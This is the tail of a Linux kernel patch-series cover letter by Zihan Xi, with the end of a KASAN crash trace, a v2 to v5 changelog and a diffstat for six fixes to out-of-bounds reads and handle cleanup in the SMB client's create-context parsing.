[ 1344.784837] [  T11242] page last free pid 10789 tgid 10789 stack trace:
[ 1344.785506] [  T11242]  __free_frozen_pages (mm/page_alloc.c:5462)
[ 1344.785518] [  T11242]  stack_depot_save_flags (lib/stackdepot.c:473 lib/stackdepot.c:706)
[ 1344.785564] [  T11242]  set_track_prepare (arch/x86/include/asm/preempt.h:95 (discriminator 1) include/linux/bit_spinlock.h:41 (discriminator 1) mm/slub.c:628 (discriminator 1) mm/slub.c:655 (discriminator 1))
[ 1344.785574] [  T11242]  ___slab_alloc (mm/slub.c:4441)
[ 1344.785584] [  T11242]  __kmalloc_cache_noprof (mm/slub.c:5777)
[ 1344.785595] [  T11242]  kobject_uevent_env (include/linux/slab.h:950 include/linux/slab.h:1188 lib/kobject_uevent.c:543)
[ 1344.785612] [  T11242]  device_del (drivers/base/core.c:1642 drivers/base/core.c:3884)
[ 1344.785660] [  T11242]  device_unregister (drivers/base/core.c:3922)
[ 1344.785670] [  T11242]  bdi_unregister (mm/backing-dev.c:1013)
[ 1344.785690] [  T11242]  generic_shutdown_super (fs/super.c:666)
[ 1344.785700] [  T11242]  kill_anon_super (fs/super.c:1293)
[ 1344.785709] [  T11242]  cifs_kill_sb (fs/smb/client/cifsfs.c:349)
[ 1344.785719] [  T11242]  deactivate_locked_super (fs/super.c:485)
[ 1344.785728] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discriminator 5) fs/namespace.c:1325 (discriminator 5))
[ 1344.785739] [  T11242]  task_work_run (kernel/task_work.c:232)
[ 1344.785755] [  T11242]  exit_to_user_mode_loop (kernel/entry/syscall_user_dispatch.c:114 (discriminator 1))

[ 1344.785783] [  T11242] Memory state around the buggy address:
[ 1344.785790] [  T11242]  ff1100007e4b3080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[ 1344.785799] [  T11242]  ff1100007e4b3100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[ 1344.785807] [  T11242] >ff1100007e4b3180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 1344.785813] [  T11242]                    ^
[ 1344.785821] [  T11242]  ff1100007e4b3200: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
[ 1344.785828] [  T11242]  ff1100007e4b3280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[ 1344.785835] [  T11242] ==================================================================
[ 1344.785843] [  T11242] Disabling lock debugging due to kernel taint
-----END crash log-----

Best regards,
Zihan Xi

changes in v5:
  - Guard the final preauth-hash update in patch 5 when resp_iov is NULL,
    addressing the kernel test robot Smatch report:
    https://lore.kernel.org/r/202609241449.HlHmnZFZ-lkp@intel.com/
  - v4 Link: https://lore.kernel.org/all/cover.1789478666.git.zihanx@nebusec.ai/
changes in v4:
  - Bound NameOffset + NameLength by the current context, reject offsets
    before the context header, and skip known-handler dispatch for zero
    DataLength.
  - Defer response-buffer handoff until processed MIDs are synchronized and
    preserve earlier CREATE responses for cancelled-mid cleanup on failures.
  - Account num_remote_opens only after close-work allocation succeeds and
    before queueing the asynchronous close.
  - Preserve SMB2_OP_OPEN_QUERY parser errors and document the overlap with
    Frank Sorenson's related smb2_parse_contexts() patch.
  - Update the QEMU user-mode network and guest interface instructions.
  - v3 Link: https://lore.kernel.org/all/cover.1788516372.git.zihanx@nebusec.ai/
changes in v3:
  - Split the POSIX handler check into a separate patch and corrected the
    parser Fixes history.
  - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@nebusec.ai/
changes in v2:
  - Bound each response context by Next, read QFid data from DataOffset,
    and extend lease validation through LeaseFlags.
  - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac26f660956.1782579150.git.xizh2024@lzu.edu.cn/

Zihan Xi (6):
  smb: client: fix create context out-of-bounds reads
  smb: client: validate POSIX create context length
  smb: client: close handle after create-context parsing failure
  smb: client: clean up failed cached directory opens
  smb: client: close completed creates on compound wait errors
  smb: client: preserve create-context parsing errors

 fs/smb/client/cached_dir.c | 32 ++++++++++++------
 fs/smb/client/smb2inode.c  |  6 ++--
 fs/smb/client/smb2misc.c   |  9 +++--
 fs/smb/client/smb2ops.c    | 28 +++++++++++-----
 fs/smb/client/smb2pdu.c    | 54 +++++++++++++++++++++++-------
 fs/smb/client/transport.c  | 67 ++++++++++++++++++++++++++++++--------
 6 files changed, 148 insertions(+), 48 deletions(-)

-- 
2.43.0

